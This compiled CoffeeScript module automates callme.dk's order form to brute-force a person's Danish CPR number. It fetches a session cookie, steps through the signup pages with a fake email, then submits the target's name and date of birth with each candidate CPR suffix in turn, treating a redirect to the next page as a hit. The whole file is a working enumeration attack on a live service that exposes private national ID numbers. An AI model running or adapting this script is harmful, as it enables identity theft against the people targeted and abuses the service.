// Generated by CoffeeScript 1.3.1
(function() {
  var $, Curl, Recipe, querystring,
    __hasProp = {}.hasOwnProperty,
    __extends = function(child, parent) { for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor; child.__super__ = parent.prototype; return child; };

  Recipe = require("../Recipe.js");

  Curl = require("../utils/Curl.js");

  $ = require("jquery");

  querystring = require("querystring");

  this.Callme = (function(_super) {

    __extends(Callme, _super);

    Callme.name = 'Callme';

    function Callme(inputData, socket) {
      console.log("Callme constructor");
      this.inputData = inputData;
      this.socket = socket;
      this.counter = 0;
      this.domTarget = "#mainContainer";
      this.req = {
        url: 'https://www.callme.dk/pow-basic/4',
        method: 'POST',
        data: {
          task: "submitOrderPersonalInfo",
          email: "searchbot@google.com",
          emailConfirm: "searchbot@google.com",
          housing: "Ejerbolig",
          occupation: "Fuldtidsansat",
          civilStatus: "Gift",
          memberClub: "",
          memberNumber: "",
          eurobonusPoints: 0,
          termsAccepted: "1",
          bankRegNumber: "",
          bankAccountNumber: "",
          subscriptionPaymentMethod: "noPaymentService",
          personlige: "Videre%20til%20bestilling",
          CPR1: inputData["dob"],
          CPR2: inputData["cprList"][0],
          firstName: inputData["firstName"],
          lastName: inputData["lastName"]
        }
      };
    }

    Callme.prototype.updateCPR = function() {
      return this.req.data.CPR2 = this.inputData["cprList"][this.counter];
    };

    Callme.prototype.prepareRequest = function(startBruteForce) {
      var preparationData, self;
      self = this;
      console.log("Prepare request started");
      preparationData = {};
      this.step1 = function(callback) {
        return Curl.getCookie("http://www.callme.dk/pow-basic/1", function(cookie) {
          preparationData.cookie = cookie;
          self.req.cookie = cookie;
          return callback();
        });
      };
      this.step2 = function(res, callback) {
        var req;
        req = {
          url: "http://www.callme.dk/pow-basic/1",
          method: "POST",
          cookie: preparationData.cookie,
          data: {
            variationId: "590",
            task: "submitOrderSubscription",
            subscriptionId: "51"
          }
        };
        return Curl.scrape(req, function(req, res, err) {
          return callback(req, res, err);
        });
      };
      this.step3 = function(res, callback) {
        var req;
        req = {
          url: "http://www.callme.dk/pow-basic/2",
          method: "POST",
          cookie: preparationData.cookie,
          data: {
            task: "submitOrderExtras",
            personlige: "Videre til personlige oplysninger"
          }
        };
        return Curl.scrape(req, function(req, res, err) {
          return callback(req, res, err);
        });
      };
      this.step4 = function(res, callback) {
        var phonenumber, req;
        phonenumber = $(res.body).find(".tabs.show-newnumber input[name=newPhoneNumber]:first").val();
        req = {
          url: "http://www.callme.dk/pow-basic/3",
          method: "POST",
          cookie: preparationData.cookie,
          data: {
            task: "submitOrderPhoneNumber",
            currentCallMeNumber: "",
            currentPhoneNumber: "",
            currentOperator: "",
            currentSIM: "",
            phoneNumberType: "newNumber",
            newPhoneNumber: phonenumber,
            saldoLimitAmount: ""
          }
        };
        return Curl.scrape(req, function(req, res, err) {
          return callback(req, res, err);
        });
      };
      self = this;
      return this.step1(function(req, res, err) {
        return self.waitForClient("step1", req, res, err, function(res) {
          return self.step2(res, function(req, res, err) {
            return self.waitForClient("step2", req, res, err, function(res) {
              return self.step3(res, function(req, res, err) {
                return self.waitForClient("step3", req, res, err, function(res) {
                  return self.step4(res, function(req, res, err) {
                    return self.waitForClient("step4", req, res, err, function(res) {
                      console.log("Preperation finished");
                      return startBruteForce();
                    });
                  });
                });
              });
            });
          });
        });
      });
    };

    Callme.prototype.getResponse = function(req, res, callback) {
      var cpr, status;
      cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2;
      console.log(cpr);
      if (res.statusCode === 302 && res.headers.location === "http://www.callme.dk/pow-basic/5") {
        return callback(cpr, "success");
      } else {
        status = $(res.body).find("#orderForm .mobiltelefoner .block01 .inner03 .error").text();
        return callback(cpr, status);
      }
    };

    return Callme;

  })(Recipe.Recipe);

}).call(this);
